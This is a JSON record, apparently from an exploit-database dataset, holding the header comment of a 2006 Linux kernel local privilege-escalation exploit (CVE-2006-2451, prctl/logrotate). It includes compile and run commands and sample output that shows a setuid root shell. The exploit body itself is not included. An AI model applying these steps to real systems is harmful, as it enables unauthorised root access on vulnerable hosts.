{
    "text": "ecve : CVE-2006-2451 ， title : Linux Kernel 2.6.13 < 2.6.17.4 - 'logrotate prctl (  ) ' Local Privilege Escalation - Linux local Exploit ， verified : Verified ， exploit_detail : / *  ，  *  $ Id : raptor_prctl2.c , v 1.3 2006/07/18 13 : 16 : 45 raptor Exp $  ，  * raptor_prctl2.c - Linux 2.6.x suid_dumpable2 ( logrotate )  ，  * Copyright ( c ) 2006 Marco Ivaldi <raptor @ 0xdeadbeef.info> ，  * The suid_dumpable support in Linux kernel 2.6.13 up to versions before ，  * 2.6.17.4 , and 2.6.16 before 2.6.16.24 , allows a local user to cause a denial ，  * of service ( disk consumption ) and POSSIBLY ( yeah , sure ;  ) gain privileges via ，  * the PR_SET_DUMPABLE argument of the prctl function and a program that causes ，  * a core dump file to be created in a directory for which the user does not ，  * have permissions ( CVE-2006-2451 ) . ，  * This exploit uses the logrotate attack vector : of course , you must be able ，  * to chdir (  ) into the /etc/logrotate.d directory in order to exploit the ，  * vulnerability. I've experimented a bit with other attack vectors as well ,  ，  * with no luck : at ( /var/spool/atjobs/ ) uses file name information to ，  * establish execution time , /etc/cron.hourly | daily | weekly | monthly want +x ，  * permissions , xinetd ( /etc/xinetd.d ) puked out the crafted garbage-filled ，  * coredump ( see also ，  * Thanks to Solar Designer for the interesting discussion on attack vectors. ，  * NOTE THAT IN ORDER TO WORK THIS EXPLOIT * MUST * BE STATICALLY LINKED !  !  !  ，  * Usage :  ，  *  $ gcc raptor_prctl2.c -o raptor_prctl2 -static -Wall ，  *  [ exploit must be statically linked ]  ，  *  $ ./raptor_prctl2 ，  *  [ please wait until logrotate is run ]  ，  *  $ ls -l /tmp/pwned ，  * -rwsr-xr-x 1 root users 7221 2006-07-18 13 : 32 /tmp/pwned ，  *  $ /tmp/pwned ，  * sh-3.00 # id ，  * uid=0 ( root ) gid=0 ( root ) groups=16 ( dialout )  , 33 ( video )  , 100 ( users )  ，  * sh-3.00 #  ，  *  [ don't forget to delete /tmp/pwned !  ]  ，  * Vulnerable platforms :  ，  * Linux from 2.6.13 up to 2.6.17.4 [ tested on SuSE Linux 2.6.13-15.8-default ]  ，  * /",
    "time": "2006-07-18"
}